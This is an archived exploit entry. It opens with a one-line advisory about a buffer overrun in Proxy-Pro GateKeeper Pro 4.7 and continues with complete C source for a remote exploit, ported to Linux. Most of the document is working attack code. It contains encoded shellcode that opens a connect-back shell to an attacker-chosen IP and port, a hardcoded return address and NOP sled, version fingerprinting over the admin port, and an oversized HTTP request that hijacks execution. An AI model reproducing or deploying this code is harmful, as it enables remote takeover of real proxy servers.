source: http://www.securityfocus.com/bid/9716/info

Proxy-Pro Professional GateKeeper is prone to a remotely exploitable buffer overrun that may be triggered by passing HTTP GET requests of excessive length through the web proxy component. This could be exploited to execute arbitrary code in the context of the software.

/******************************************************************/
 /* [Crpt]    GateKeeper Pro 4.7 remote sploit by
kralor    [Crpt] */

/******************************************************************/
 /* bug discovered & coded by: kralor [from
coromputer]            */
 /* tested on: win2k pro and winXP                    
            */
 /* it uses a static offset to hijack execution to the
shellcode.. */
 /* so it is 100% universal. Nothing more to say..    
            */

/******************************************************************/
 /*informations: www.coromputer.net,irc undernet
#coromputer       *
  *                                                   
            *
  *       Ported to Linux by shaun2k2 -
shaunige@yahoo.co.uk       *
  *                     www.nettwerked.co.uk          
            */

/******************************************************************/


/* UNIX include files. */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>

/* Our defines. */
#define PORT 3128
#define ADMIN_PORT 2000
#define VERSION "4.7.0"
#define RET_POS 4079
#define SIZE 4105
#define RET_ADDR 0x03b1e121
/* Changing this might be advisable :P */
#define REQ  "GET http://www.microsoft.com/"
#define REQ2 "\r\nHost: www.microsoft.com\r\n\r\n"
 // sequence of 4 opcodes
#define HOP 0xd4 // host opcode
#define POP 0xd7 // port opcode

 int cnx(char *host, int port)
 {
        int sock; /* our little socket. */
        struct sockaddr_in yeah;
        struct hostent *she;

        /* Create the socket. */
        sock=socket(AF_INET,SOCK_STREAM,0);
        if(!sock) {
                printf("error: unable to create
socket\r\n");
                return 0;
        }

        /* Fill in the address info struct. */
        yeah.sin_family=AF_INET;
        yeah.sin_addr.s_addr=inet_addr(host);
        yeah.sin_port=htons((u_short)port);

        /* Does the host exist? */
 if((she=gethostbyname(host))!=NULL) {
        memcpy((char
*)&yeah.sin_addr,she->h_addr,she->h_length);
        } else {
       
if((yeah.sin_addr.s_addr=inet_addr(host))==INADDR_NONE)
{
                printf("error: cannot resolve
host\r\n");
                return 0;
                }
        }
        printf("[+] Connecting to %-30s ...",host);
        if(connect(sock,(struct
sockaddr*)&yeah,sizeof(yeah))!=0) {
                printf("error: connection
refused\r\n");
                return 0;
                }
        printf("Done\r\n");
        return sock;
 }


 void banner(void)
 {
        printf("\r\n\t  [Crpt] GateKeeper Pro 4.7
remote sploit by kralor [Crpt]\r\n");
        printf("\t\t www.coromputer.net && undernet
#coromputer\r\n\r\n");
        printf("\n\t\t Ported to Linux by shaun2k2 -
shaunige@yahoo.co.uk\n\n");
        return;
 }


 void syntax(char *prog)
 {
        printf("syntax: %s <host> <your_ip>
<your_port>\r\n",prog);
        exit(0);
 }

 int main(int argc, char *argv[])
 {
        int sock;
        char buffer[1024],useme[SIZE],*ptr;
        unsigned long host,port;
        unsigned int i;
        char shellc0de[] =   /*
sizeof(shellc0de+xorer) == 332 bytes */
        /* classic xorer */
       
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66"
        "\xb9\x33\x01\x80\x33\x95\x43\xe2\xfa"
        /* shellc0de */
        "\x1e\x61\xc0\xc3\xf1\x34\xa5"
       
"\x95\x95\x95\x1e\xd5\x99\x1e\xe5\x89\x38\x1e\xfd\x9d\x7e\x95\x1e"
       
"\x50\xcb\xc8\x1c\x93\x6a\xa3\xfd\x1b\xdb\x9b\x79\x7d\x38\x95\x95"
       
"\x95\xfd\xa6\xa7\x95\x95\xfd\xe2\xe6\xa7\xca\xc1\x6a\x45\x1e\x6d"
       
"\xc2\xfd\x4c\x9c\x60\x38\x7d\x06\x95\x95\x95\xa6\x5c\xc4\xc4\xc4"
       
"\xc4\xd4\xc4\xd4\xc4\x6a\x45\x1c\xd3\xb1\xc2\xfd\x79\x6c\x3f\xf5"
       
"\x7d\xec\x95\x95\x95\xfd\xd4\xd4\xd4\xd4\xfd\xd7\xd7\xd7\xd7\x1e"
       
"\x59\xff\x85\xc4\x6a\xe3\xb1\x6a\x45\xfd\xf6\xf8\xf1\x95\x1c\xf3"
       
"\xa5\x6a\xa3\xfd\xe7\x6b\x26\x83\x7d\xc4\x95\x95\x95\x1c\xd3\x8b"
       
"\x16\x79\xc1\x18\xa9\xb1\xa6\x55\xa6\x5c\x16\x54\x80\x3e\x77\x68"
       
"\x53\xd1\xb1\x85\xd1\x6b\xd1\xb1\xa8\x6b\xd1\xb1\xa9\x1e\xd3\xb1"
       
"\x1c\xd1\xb1\xdd\x1c\xd1\xb1\xd9\x1c\xd1\xb1\xc5\x18\xd1\xb1\x85"
       
"\xc1\xc5\xc4\xc4\xc4\xff\x94\xc4\xc4\x6a\xe3\xa5\xc4\x6a\xc3\x8b"
       
"\x6a\xa3\xfd\x7a\x5b\x75\xf5\x7d\x97\x95\x95\x95\x6a\x45\xc6\xc0"
       
"\xc3\xc2\x1e\xf9\xb1\x8d\x1e\xd0\xa9\x1e\xc1\x90\xed\x96\x40\x1e"
       
"\xdf\x8d\x1e\xcf\xb5\x96\x48\x76\xa7\xdc\x1e\xa1\x1e\x96\x60\xa6"
       
"\x6a\x69\xa6\x55\x39\xaf\x51\xe1\x92\x54\x5a\x98\x96\x6d\x7e\x67"
       
"\xae\xe9\xb1\x81\xe0\x74\x1e\xcf\xb1\x96\x48\xf3\x1e\x99\xde\x1e"
       
"\xcf\x89\x96\x48\x1e\x91\x1e\x96\x50\x7e\x97\xa6\x55\x1e\x40\xca"
        "\xcb\xc8\xce\x57\x91\x95";

        banner();

 if(argc!=4)
        syntax(argv[0]);
        host=inet_addr(argv[2])^0x95959595;
        port=atoi(argv[3]);
        if(port<=0||port>65535) {
                printf("error: <port> must be between
1 and 65535\r\n");
                return -1;
        }
        port=htons((unsigned short)port);
        port=port<<16;
        port+=0x0002;
        port=port^0x95959595;

 for(i=0;i<sizeof(shellc0de);i++) {
        if((unsigned char)shellc0de[i]==HOP&&(unsigned
char)shellc0de[i+1]==HOP)
                if((unsigned
char)shellc0de[i+2]==HOP&&(unsigned
char)shellc0de[i+3]==HOP) {
                        memcpy(&shellc0de[i],&host,4);
                        host=0;
                        }
        if((unsigned char)shellc0de[i]==POP&&(unsigned
char)shellc0de[i+1]==POP)
                if((unsigned
char)shellc0de[i+2]==POP&&(unsigned
char)shellc0de[i+3]==POP) {
                        memcpy(&shellc0de[i],&port,4);
                        port=0;
                        }
 }
 if(host||port) {
        printf("[i] error: unabled to find ip/port
sequence in shellc0de\r\n");
        return -1;
        }

        printf("[-] Getting version through
administration interface\r\n");
        sock=cnx(argv[1],ADMIN_PORT);
 if(!sock)
        printf("[i] warning: couldn't connect to admin
int to get version, trying anyway\r\n");
 else {

        /* If you really aren't a script kiddie, you
might wanna remove
         * these ;) */
        send(sock,"I'm a script kiddie\r\n",21,0);
        memset(buffer,0,sizeof(buffer));
        recv(sock,buffer,sizeof(buffer),0);
        memset(buffer,0,sizeof(buffer));

        /* recv the daemon version. */
        recv(sock,buffer,sizeof(buffer),0);

        /* Checking if the daemon is GateKeeper. */
        ptr=strstr(buffer,"GateKeeper@");

        if(!ptr)
        printf("[i] warning: version not found, trying
anyway\r\n");
 else {
        ptr+=11;

        /* Check for the vulnerable version. */
        if(strncmp(ptr,VERSION,strlen(VERSION))) {
                printf("[i] error: wrong
version\r\n");
                return -1;
        }
        printf("[i] %-44s ...OK\r\n","version");
        }
 }
        printf("[i] Starting to exploit\r\n");
        sock=cnx(argv[1],PORT);
 if(!sock)
        return -1;
        printf("[i] Preparing magic %-28s
...","packet");

        /* Fill the exploit buffer with NOPs (hex
0x90). */
        memset(useme,0x90,SIZE);

        /* Copy the shellcode into the exploit buffer.
*/
       
memcpy(&useme[RET_POS-0x8ac],shellc0de,sizeof(shellc0de));

        /* Return address here.  The ret address is
placed in a specific
         * place, as kralor seems to know exactly
where it needs to be. */
        *(unsigned long*)&useme[RET_POS] = RET_ADDR;
       
memcpy(&useme[RET_POS+12],"\xe9\xed\xf6\xff\xff",5);
// jmp $ - 0x92c
        printf("Done\r\n");
        printf("[i] Sending magic packet              
          ...");
        send(sock,REQ,strlen(REQ),0);

        /* Inject the exploit buffer! */
        send(sock,useme,sizeof(useme),0);
        send(sock,REQ2,strlen(REQ2),0);
        printf("Done\r\n");
        close(sock);

        /* return sucess. */
        return 0;
 }